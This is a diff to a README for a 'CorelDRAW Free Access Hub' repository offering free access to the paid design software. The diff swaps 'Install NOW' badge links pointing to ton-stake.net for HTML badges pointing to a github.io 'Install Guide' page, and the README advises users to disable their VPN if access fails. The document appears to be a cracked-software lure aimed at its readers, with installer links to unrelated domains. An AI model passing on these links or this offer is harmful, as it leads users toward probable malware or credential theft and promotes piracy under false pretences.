@@ -5,10 +5,11 @@
 
 **Description**: Unleash your creativity with the **CorelDRAW Free Access Hub** in 2025! This repository offers exclusive tutorials, resources, and tips to explore features like vector illustration, photo editing, and page layout. Get started with free access and join our vibrant community of designers!  
 
-[![Install CorelDRAW](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://coreldrawcommunity.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
----
-
+ 
 ## 📋 Installation Guide  
 
 Start designing with CorelDRAW using these simple steps to access the free resources! 🛠️  
@@ -28,9 +29,9 @@ Start designing with CorelDRAW using these simple steps to access the free resou
 5. **Access Problems?** 🌐  
    If the package access fails, try disabling your VPN or switching browsers (e.g., Chrome, Firefox).  
 
-[![Install CorelDRAW](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
-
----
+<a href="https://coreldrawcommunity.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ## 💡 Why Choose CorelDRAW Free Access  
 
